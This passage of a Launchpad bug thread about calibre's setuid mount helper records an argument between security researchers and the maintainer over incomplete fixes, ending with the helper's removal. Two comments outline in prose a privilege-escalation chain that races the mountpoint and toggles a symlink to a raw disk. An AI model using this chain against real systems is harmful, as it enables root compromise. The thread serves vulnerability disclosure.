Just so this is perfectly clear: what's happening in this bug report right now is a perfect example of how *not* to do security response.  When faced with two people who clearly know a few things about secure coding, rather than taking their advice and actually fixing the root cause of the problem (or abandon it as a hopeless situation, which is probably the more appropriate response), you've chosen to waste our time by demanding that we write weaponized exploits to exploit what most people already know to be exploitable.  To top it off, when shown repeatedly how your half-baked "fixes" don't actually fix anything, rather than taking our advice you just add another small hurdle that can be trivially bypassed.  It would be sad if it weren't so funny.

I've decided that it's time to stop beating a dead horse.  Usually I get paid good money to own software this hard, and I don't think you're worth making an exception.  Best of luck, I'm sure you'll figure it out eventually.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/75" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~zx2c4" class="sprite person">Jason A. Donenfeld (zx2c4)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-04T19:35:56.412785+00:00" title="2011-11-04 19:35:56 UTC">on 2011-11-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/75"> #75</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Hello. I&#x27;ve attached a patch for you, as requested. It replaces the mount helper with the nice udisks-based script that ubuntu ships. For distributions that do not support udisks, they can add their own. Or, you can write something different. In light of this, you might consider removing the following text from your website: &quot;Please do not use your distribution provided calibre package, as those are often buggy/outdated. Instead use the Binary install described below.&quot; Goodbye.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Hello. I've attached a patch for you, as requested. It replaces the mount helper with the nice udisks-based script that ubuntu ships. For distributions that do not support udisks, they can add their own. Or, you can write something different. In light of this, you might consider removing the following text from your website: "Please do not use your distribution provided calibre package, as those are often buggy/outdated. Instead use the Binary install described below." Goodbye.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/76" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kovid" class="sprite person">Kovid Goyal (kovid)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-04T19:41:27.526977+00:00" title="2011-11-04 19:41:27 UTC">on 2011-11-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/76"> #76</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Dan: As I suspected, you&#x27;re in this not to contribute something to the community, but as a destructive influence. You will not be missed. Try and remember that I am not attempting to fix calibre-<wbr />mount-helper for some sort of personal gain, but simply to allow people using calibre to have the best possible experience. I readily admit I don&#x27;t know as much about secure coding as you do, but hey, at least one of us is trying to learn something. Look back at the start of this bug report. Every time I was convinced of the existence of an actual exploit, I have attempted to fix it. Maybe my fixes were naive, but dont forget that it&#x27;s a lot easier to find holes in something, than to build somethig without holes in the first place.</p>
<p>@Jason: Indeed, I did overlook the second realpath call, now fixed.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Dan: As I suspected, you're in this not to contribute something to the community, but as a destructive influence. You will not be missed. Try and remember that I am not attempting to fix calibre-mount-helper for some sort of personal gain, but simply to allow people using calibre to have the best possible experience. I readily admit I don't know as much about secure coding as you do, but hey, at least one of us is trying to learn something. Look back at the start of this bug report. Every time I was convinced of the existence of an actual exploit, I have attempted to fix it. Maybe my fixes were naive, but dont forget that it's a lot easier to find holes in something, than to build somethig without holes in the first place.

@Jason: Indeed, I did overlook the second realpath call, now fixed.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/77" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~zx2c4" class="sprite person">Jason A. Donenfeld (zx2c4)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-04T19:46:29.301984+00:00" title="2011-11-04 19:46:29 UTC">on 2011-11-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/77"> #77</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Kovid:</p>
<p>Yet you continue to ignore some major advice about how to fix it. Have you chdir&#x27;d yet? No. Still vulnerable.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Kovid:

Yet you continue to ignore some major advice about how to fix it. Have you chdir'd yet? No. Still vulnerable.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/78" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~zx2c4" class="sprite person">Jason A. Donenfeld (zx2c4)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-04T19:51:36.479402+00:00" title="2011-11-04 19:51:36 UTC">on 2011-11-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/78"> #78</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>My final word is that you should give up trying to reinvent the wheel, and use a method supplied by the distro for mounting disks. It&#x27;s not worth my time to play whack-a-mole here. As Dan said, &quot;Usually I get paid good money to own software this hard, and I don&#x27;t think you&#x27;re worth making an exception.&quot; Indeed.</p>
<p>The solution is easy and obvious, but it involves backing away from stubbornness and accepting that the distro-supplied tools handle mounting inline with distro policy, and it isn&#x27;t your place to reinvent things. Take a look at Gentoo Mike&#x27;s post from a while back -- it&#x27;s dead on. Besides, you haven&#x27;t even begun to address issues #1-#3.</p>
<p>I believe this discussion is over. Goodbye Kovid. I wish you well with Calibre and that you can restore the security confidence of your users.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">My final word is that you should give up trying to reinvent the wheel, and use a method supplied by the distro for mounting disks. It's not worth my time to play whack-a-mole here. As Dan said, "Usually I get paid good money to own software this hard, and I don't think you're worth making an exception." Indeed.

The solution is easy and obvious, but it involves backing away from stubbornness and accepting that the distro-supplied tools handle mounting inline with distro policy, and it isn't your place to reinvent things. Take a look at Gentoo Mike's post from a while back -- it's dead on. Besides, you haven't even begun to address issues #1-#3.

I believe this discussion is over. Goodbye Kovid. I wish you well with Calibre and that you can restore the security confidence of your users.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/79" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~dan-j-rosenberg" class="sprite person">Dan Rosenberg (dan-j-rosenberg)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-04T19:56:36.601851+00:00" title="2011-11-04 19:56:36 UTC">on 2011-11-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/79"> #79</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I keep trying to leave this bug report but I keep getting dragged in.  It&#x27;s worse than Twitter.</p>
<p>&quot;As I suspected, you&#x27;re in this not to contribute something to the community, but as a destructive influence. You will not be missed.&quot;</p>
<p>You seriously think I came to this thread to start a fight with you?  What about the several *hundred* other security bugs I&#x27;ve fixed in open source software on my own free time?</p>
<p>&quot;Every time I was convinced of the existence of an actual exploit, I have attempted to fix it.&quot;</p>
<p>Except for the part where I posted a working exploit and you completely ignored me.</p>
<p>&quot;Maybe my fixes were naive, but dont forget that it&#x27;s a lot easier to find holes in something, than to build somethig without holes in the first place.&quot;</p>
<p>I disagree, I think it&#x27;s more like &quot;it&#x27;s easier to do something properly from the beginning than to patch a broken implementation one exploit at a time.&quot;</p>
<p>Your code is still broken, you can mount a legitimate block device on top of another directory in /dev by exploiting the mountpoint race that still exists, and then use that now-writable directory in /dev to mount an arbitrary filesystem on top of wherever.  I suggest you accept Jason&#x27;s patch and stop trying to fix this code.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I keep trying to leave this bug report but I keep getting dragged in.  It's worse than Twitter.

"As I suspected, you're in this not to contribute something to the community, but as a destructive influence. You will not be missed."

You seriously think I came to this thread to start a fight with you?  What about the several *hundred* other security bugs I've fixed in open source software on my own free time?

"Every time I was convinced of the existence of an actual exploit, I have attempted to fix it."

Except for the part where I posted a working exploit and you completely ignored me.

"Maybe my fixes were naive, but dont forget that it's a lot easier to find holes in something, than to build somethig without holes in the first place."

I disagree, I think it's more like "it's easier to do something properly from the beginning than to patch a broken implementation one exploit at a time."

Your code is still broken, you can mount a legitimate block device on top of another directory in /dev by exploiting the mountpoint race that still exists, and then use that now-writable directory in /dev to mount an arbitrary filesystem on top of wherever.  I suggest you accept Jason's patch and stop trying to fix this code.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/80" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kovid" class="sprite person">Kovid Goyal (kovid)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-04T20:25:37+00:00" title="2011-11-04 20:25:37 UTC">on 2011-11-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/80"> #80</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Jason: Well, if you do not wish to help, that leaves me with no choice but to<br />
remove the mount helper. I think it&#x27;s a pity, for those people for whom<br />
device detection in calibre will stop working out of the box. But, I tried, to<br />
the best of my ability. I had hoped that we could work together to make it a<br />
possibility, but, apparently not.</p>
<p>Closing bug as fix released (currently I only have the energy to add an exit()<br />
at the start of main, the full removal will have to wait for a good nights<br />
sleep).</p>
<p>&nbsp;&nbsp;status fixreleased</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Jason: Well, if you do not wish to help, that leaves me with no choice but to
remove the mount helper. I think it's a pity, for those people for whom
device detection in calibre will stop working out of the box. But, I tried, to
the best of my ability. I had hoped that we could work together to make it a
possibility, but, apparently not.

Closing bug as fix released (currently I only have the energy to add an exit()
at the start of main, the full removal will have to wait for a good nights
sleep).

  status fixreleased</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in calibre: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Confirmed &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/81" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~preston-sumner" class="sprite person">Preston Sumner (preston-sumner)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-04T20:33:13.412168+00:00" title="2011-11-04 20:33:13 UTC">on 2011-11-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/81"> #81</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@kovid</p>
<p>Your behavior toward Dan is confusing, as he has been cordial and informative. There is nothing to suggest he has been a &quot;destructive influence&quot; in any of his posts. It was you who first showed attitude toward both Dan and Jason in posts #7 and #9, the consequences being a bug report that has now received a lot of attention elsewhere for the wrong reasons.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@kovid

Your behavior toward Dan is confusing, as he has been cordial and informative. There is nothing to suggest he has been a "destructive influence" in any of his posts. It was you who first showed attitude toward both Dan and Jason in posts #7 and #9, the consequences being a bug report that has now received a lot of attention elsewhere for the wrong reasons.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/82" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~zx2c4" class="sprite person">Jason A. Donenfeld (zx2c4)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-04T20:35:53.615040+00:00" title="2011-11-04 20:35:53 UTC">on 2011-11-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/82"> #82</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Dan:</p>
<p>Right.</p>
<p>In other words, mount /dev/sdaX to /dev/newfolder using the race condition exploited in .70-calibrer. Then build the stager in /dev/newfolder/<wbr />home/username/<wbr />whatever. Then use the race exploited in .80-calibrer to toggle whatever between being a symlink to /dev/sda and being the stager.</p>
<p>The tricks are endless.</p>
<p>OKAY GOODBYE BUGREPORT.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Dan:

Right.

In other words, mount /dev/sdaX to /dev/newfolder using the race condition exploited in .70-calibrer. Then build the stager in /dev/newfolder/home/username/whatever. Then use the race exploited in .80-calibrer to toggle whatever between being a symlink to /dev/sda and being the stager.

The tricks are endless.


OKAY GOODBYE BUGREPORT.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/83" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~zx2c4" class="sprite person">Jason A. Donenfeld (zx2c4)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-04T20:36:42.596906+00:00" title="2011-11-04 20:36:42 UTC">on 2011-11-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/83"> #83</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Kovid</p>
<p>Great to hear!</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Kovid

Great to hear! </textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/84" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kovid" class="sprite person">Kovid Goyal (kovid)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-04T20:39:40+00:00" title="2011-11-04 20:39:40 UTC">on 2011-11-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/84"> #84</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Dan: You were on my ignore list, which meant I never saw your exploit (I<br />
interact with launchpad via email). I only saw it when Jason mentioned it in a<br />
post of his. If I had seen it earlier, I would have attempted to fix it. See<br />
for instance my posts asking Jason for news on an updated exploit.</p>
<p>And for someone not trying to pick a fight, you certainly succeeded.</p>
<p>&quot;it&#x27;s easier to do something properly<br />
from the beginning than to patch a broken implementation one exploit at<br />
a time.&quot;</p>
<p>Now if only we had a working time travel machine. Given that in the now we<br />
have a broken implementation, our options are:</p>
<p>1) Try to fix it, one exploit at a time.</p>
<p>2) Re-write it from scratch. Since the only one volunteering to do any<br />
re-writing was me, I don&#x27;t see how that would have improved matters at all.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Dan: You were on my ignore list, which meant I never saw your exploit (I
interact with launchpad via email). I only saw it when Jason mentioned it in a
post of his. If I had seen it earlier, I would have attempted to fix it. See
for instance my posts asking Jason for news on an updated exploit. 

And for someone not trying to pick a fight, you certainly succeeded.

"it's easier to do something properly                                                                      
from the beginning than to patch a broken implementation one exploit at                                                                       
a time."

Now if only we had a working time travel machine. Given that in the now we
have a broken implementation, our options are:

1) Try to fix it, one exploit at a time.

2) Re-write it from scratch. Since the only one volunteering to do any
re-writing was me, I don't see how that would have improved matters at all.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/85" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kovid" class="sprite person">Kovid Goyal (kovid)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-04T20:58:07+00:00" title="2011-11-04 20:58:07 UTC">on 2011-11-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/85"> #85</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@preston:</p>
<p>Well, let me say that if I was the one that first showed attitude, I<br />
apologize. But you have to remember that I do *all* calibre bug triage (besides<br />
doing a large part of the developement). I get to deal with lots of bug<br />
reports from people, the vast majority of which are dubious at best. In<br />
Jason&#x27;s original post, only one of his five flaws seemed serious to me (the one<br />
he attached an exploit for), so that is the one I fixed. It turned out I was<br />
wrong about the mount exploit, but, from my perspective, I don&#x27;t know Jason<br />
from Adam, and he has to convince me of the seriousness of his claims, merely<br />
saying they are serious is something I will ignore, from long and exhausting<br />
experience. When he did prove its seriousness to me, I tried to fix it, as<br />
best I could.</p>
<p>You may well ask why I didn&#x27;t just take his advice and abandon the mount<br />
helper. For me to do something that drastic, I must be convinced it is indeed<br />
the best course possible. That may make me stubborn at times, but it is also<br />
the attitude that ensures calibre remains as stable as possible.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@preston:

Well, let me say that if I was the one that first showed attitude, I
apologize. But you have to remember that I do *all* calibre bug triage (besides
doing a large part of the developement). I get to deal with lots of bug
reports from people, the vast majority of which are dubious at best. In
Jason's original post, only one of his five flaws seemed serious to me (the one
he attached an exploit for), so that is the one I fixed. It turned out I was
wrong about the mount exploit, but, from my perspective, I don't know Jason
from Adam, and he has to convince me of the seriousness of his claims, merely
saying they are serious is something I will ignore, from long and exhausting
experience. When he did prove its seriousness to me, I tried to fix it, as
best I could. 

You may well ask why I didn't just take his advice and abandon the mount
helper. For me to do something that drastic, I must be convinced it is indeed
the best course possible. That may make me stubborn at times, but it is also
the attitude that ensures calibre remains as stable as possible.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/86" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
